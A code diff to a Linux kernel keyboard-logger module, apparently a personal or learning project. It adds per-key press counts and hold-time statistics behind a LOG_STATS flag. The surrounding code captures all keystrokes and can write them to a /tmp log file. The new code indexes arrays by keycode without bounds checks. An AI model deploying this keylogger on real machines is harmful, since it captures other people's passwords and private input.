@@ -9,12 +9,14 @@
 #include <linux/slab.h>
 #include <linux/err.h>
 #include <linux/kernel.h>
+#include <linux/spinlock.h>
 
 #define IGNORE_REPEAT
 // #define IGNORE_REPEAT_TIMESTAMP
 #define LOG_KERNEL
 // #define LOG_TMP_FILE
 // #define LOG_ONLY_PRESSED
+// #define LOG_STATS
 
 typedef struct {
     const char *name;
@@ -145,6 +147,19 @@ KeyMap key_table[] = {
 #define MAX_LOG_ENTRIES 512
 #define MAX_LOG_LEN 128
 #define LOG_FILE_PATH "/tmp/jareste_keylogger.log"
+#define MAX_KEYS 256
+
+#ifdef LOG_STATS
+struct key_stats {
+    u64 press_count;
+    u64 total_hold_time; // in nanoseconds
+    ktime_t last_press_time;
+    bool is_pressed;
+};
+
+static struct key_stats stats[MAX_KEYS];
+static DEFINE_SPINLOCK(stats_lock);
+#endif // LOG_STATS
 
 static char log_entries[MAX_LOG_ENTRIES][MAX_LOG_LEN];
 static int log_start = 0;
@@ -169,6 +184,65 @@ static struct miscdevice keyboard_misc_device = {
     .fops = &fops,
 };
 
+static void print_stats(void)
+{
+#ifdef LOG_STATS
+    int i;
+
+    pr_info("=== Key Statistics ===\n");
+    for (i = 0; i < MAX_KEYS; i++)
+    {
+        if (stats[i].press_count > 0)
+        {
+            u64 total_time_ns = stats[i].total_hold_time;
+            u64 total_time_ms = total_time_ns / 1000000;
+            u64 total_time_s = total_time_ms / 1000;
+            total_time_ms %= 1000;
+
+            if (total_time_s > 0)
+            {
+                pr_info("Key '%s': Pressed %llu times, Total hold time %llu s %llu ms\n",
+                        key_table[i].name, stats[i].press_count, total_time_s, total_time_ms);
+            }
+            else
+            {
+                pr_info("Key '%s': Pressed %llu times, Total hold time %llu ms\n",
+                        key_table[i].name, stats[i].press_count, total_time_ms);
+            }
+        }
+    }
+    pr_info("====================\n");
+#endif // LOG_STATS
+}
+
+static void m_add_stats(int keycode, bool is_down)
+{
+#ifdef LOG_STATS
+    spin_lock(&stats_lock);
+
+    if (is_down)
+    {
+        if (!stats[keycode].is_pressed)
+        {
+            stats[keycode].press_count++;
+            stats[keycode].last_press_time = ktime_get();
+            stats[keycode].is_pressed = true;
+        }
+    }
+    else
+    {
+        if (stats[keycode].is_pressed)
+        {
+            ktime_t now = ktime_get();
+            stats[keycode].total_hold_time += ktime_to_ns(ktime_sub(now, stats[keycode].last_press_time));
+            stats[keycode].is_pressed = false;
+        }
+    }
+ 
+    spin_unlock(&stats_lock);
+#endif // LOG_STATS
+}
+
 static int key_event_notifier(struct notifier_block *nb, unsigned long action, void *data)
 {
     struct keyboard_notifier_param *param = data;
@@ -192,6 +266,8 @@ static int key_event_notifier(struct notifier_block *nb, unsigned long action, v
 
         int current_index = (log_start + log_count) % MAX_LOG_ENTRIES;
 
+    m_add_stats(param->value, param->down);
+
 #ifdef IGNORE_REPEAT
         /* Will ignore the same key press event */
         size_t timestamp_len = 8;
@@ -211,9 +287,9 @@ static int key_event_notifier(struct notifier_block *nb, unsigned long action, v
             mutex_unlock(&log_lock);
             return NOTIFY_OK;
         }
-#else
+#else /* No ignore */
         /* Will accept the same key press event */
-#endif
+#endif // IGNORE_REPEAT
 
         strncpy(log_entries[current_index], entry, MAX_LOG_LEN - 1);
         log_entries[current_index][MAX_LOG_LEN - 1] = '\0';
@@ -305,12 +381,12 @@ static void keyboard_exit(void)
 #ifdef LOG_ONLY_PRESSED
         if (strstr(log_entries[index], "Released") != NULL)
             continue;
-#endif
+#endif // LOG_ONLY_PRESSED
 
         pr_info("%s", log_entries[index]);
     }
     mutex_unlock(&log_lock);
-#endif
+#endif // LOG_KERNEL
 
 #ifdef LOG_TMP_FILE
     struct file *log_file;
@@ -334,7 +410,7 @@ static void keyboard_exit(void)
 #ifdef LOG_ONLY_PRESSED
         if (strstr(log_entries[index], "Released") != NULL)
             continue;
-#endif
+#endif // LOG_ONLY_PRESSED
         const char *current_log = log_entries[index];
         size_t log_len = strlen(current_log);
 
@@ -344,16 +420,19 @@ static void keyboard_exit(void)
     mutex_unlock(&log_lock);
 
     filp_close(log_file, NULL);
-#endif
+#endif // LOG_TMP_FILE
 
     unregister_keyboard_notifier(&nb);
     misc_deregister(&keyboard_misc_device);
+
+    print_stats();
+
 #ifdef LOG_KERNEL
     pr_info("Keyboard logger unloaded successfully.\n");
-#endif
+#endif // LOG_KERNEL
 #ifdef LOG_TMP_FILE
     pr_info("Keyboard logger unloaded successfully. Logs saved to %s\n", LOG_FILE_PATH);
-#endif
+#endif // LOG_TMP_FILE
 }
 
 module_init(keyboard_init);
